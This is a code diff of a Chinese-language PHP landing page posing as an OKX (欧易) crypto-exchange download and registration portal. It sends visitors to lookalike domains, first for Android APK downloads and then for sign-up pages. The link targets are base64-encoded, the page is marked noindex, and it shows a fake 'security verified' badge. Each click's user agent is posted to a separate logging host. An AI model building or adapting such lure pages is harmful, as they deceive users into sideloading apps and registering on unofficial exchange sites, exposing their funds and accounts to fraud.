@@ -1,20 +1,19 @@
 <?php
-// 三个下载链接配置
-$primaryUrl = 'https://static.glgle.cn/upgradeapp/okx-android_ACE529253.apk'; // 主用下载
-$backupUrl1 = 'https://download.ouyi.win/okx-android_ACE529253.apk'; // 备用下载1
-$backupUrl2 = 'https://ouyi.win/okx-android_ACE529253.apk'; // 备用下载2
+$primaryUrl = 'https://www.ouchyi.support/zh-hans/join?channelId=ACE529253'; // 主用下载
+$backupUrl1 = 'https://www.ouchyi.co/zh-hans/join?shortCode=Q7tTR4&channelId=ACE529253'; // 备用下载1
+$backupUrl2 = 'https://www.ouzhyi.co/zh-hans/join?channelId=ACE529253'; // 备用下载2
 
-// 加密处理
 $encryptedPrimary = base64_encode($primaryUrl);
 $encryptedBackup1 = base64_encode($backupUrl1);
 $encryptedBackup2 = base64_encode($backupUrl2);
 ?>
 <!DOCTYPE html>
+<html lang="<?= htmlspecialchars($lang_code) ?>">
 <head>
   <meta charset="UTF-8">
   <meta name="robots" content="noindex, nofollow">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>OKX</title>
+  <title>欧易注册入口(国内用户专属）</title>
   <style>
     :root {
       --primary: #13bd2c;
@@ -148,7 +147,7 @@ $encryptedBackup2 = base64_encode($backupUrl2);
   </style>
 </head>
 <body>
-  <div class="container">
+    <div class="container">
     <div class="security-badge">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
         <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.857-9.809a.75.75 0 00-1.214-.882l-3.483 4.79-1.88-1.88a.75.75 0 10-1.06 1.061l2.5 2.5a.75.75 0 001.137-.089l4-5.5z" clip-rule="evenodd" />
@@ -157,26 +156,34 @@ $encryptedBackup2 = base64_encode($backupUrl2);
     </div>
     
     <h1>链接已通过安全验证</h1>
-    <p>系统已自动为您选择最优下载通道</p>
-      <h3 style="color: green;" >若Wifi下载慢，请切换至5G流量下载快</h3>
+    <p>系统已自动为您选择最优注册通道</p>
+        <h3 style="color: red;" >Win和iOS版请注册后进入下载</h3>
     <div class="btn-group">
       <button class="btn btn-primary" onclick="startDownload(event, 'primary')">
-       主要下载通道
+       主要注册入口
         <span class="loader" id="loader1"></span>
       </button>
       
       <button class="btn btn-secondary" onclick="startDownload(event, 'backup1')">
-      备用下载地址 Ⅰ
+      备用注册地址 Ⅰ
         <span class="loader" id="loader2"></span>
       </button>
       
       <button class="btn btn-tertiary" onclick="startDownload(event, 'backup2')">
-         备用下载地址 Ⅱ
+         备用注册地址 Ⅱ
         <span class="loader" id="loader3"></span>
       </button>
     </div>
     
     <p class="notice">如果主通道无法进入，请尝试备用通道</p>
+        <div class="btn-group" style="margin-top: 2rem;">
+    <a href="/jump/android.php" class="btn btn-primary" style="text-decoration: none;" target="_blank">
+      立即下载欧易(安卓版)
+    </a>
+    <a href="/" class="btn btn-secondary" style="text-decoration: none;">
+      返回首页
+    </a>
+  </div>
   </div>
 
   <script>
@@ -196,35 +203,57 @@ $encryptedBackup2 = base64_encode($backupUrl2);
       }
     };
 
-    function startDownload(event, type) {
-      // 阻止默认行为
-      event.preventDefault();
-      
-      // 获取配置
-      const config = downloadConfig[type];
-      if (!config) return;
-      
-      // 获取元素
-      const clickedBtn = event.currentTarget;
-      const loader = document.getElementById(config.loaderId);
-      
-      // 更新UI状态
-      clickedBtn.disabled = true;
-      clickedBtn.classList.add('disabled');
-      if (loader) loader.style.display = 'inline-block';
-      
-      // 使用新窗口打开下载
-      const downloadWindow = window.open('about:blank', '_blank');
-      downloadWindow.location.href = `redirect.php?type=${type}&token=${config.token}`;
-      
-      // 5秒后恢复按钮状态
-      setTimeout(() => {
-        clickedBtn.disabled = false;
-        clickedBtn.classList.remove('disabled');
-        if (loader) loader.style.display = 'none';
-      }, 5000);
+ function startDownload(event, type) {
+    event.preventDefault();
+
+    const config = downloadConfig[type];
+    if (!config) return;
+
+    const clickedBtn = event.currentTarget;
+    const loader = document.getElementById(config.loaderId);
+
+    clickedBtn.disabled = true;
+    clickedBtn.classList.add('disabled');
+    if (loader) loader.style.display = 'inline-block';
+
+    try {
+      // 解码真实链接
+      const decodedUrl = atob(config.token);
+      const sourceDomain = window.location.hostname;
+      const targetDomain = new URL(decodedUrl).hostname;
+
+          // 记录点击日志（异步，不阻塞跳转）
+     const logData = {
+  type: type,
+  source: window.location.hostname,
+  target: new URL(decodedUrl).hostname,
+  ua: navigator.userAgent
+};
+
+fetch('https://logs.okxapk.com/log/log_sigup.php', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify(logData),
+  keepalive: true
+}).catch(() => {});
+
+      // 尝试打开新窗口
+      const newWindow = window.open(decodedUrl, '_blank');
+      if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
+        window.location.href = decodedUrl;
+      }
+    } catch (e) {
+      console.error('下载失败:', e);
     }
+
+    setTimeout(() => {
+      clickedBtn.disabled = false;
+      clickedBtn.classList.remove('disabled');
+      if (loader) loader.style.display = 'none';
+    }, 3000);
+  }
   </script>
 </body>
 </html>
-
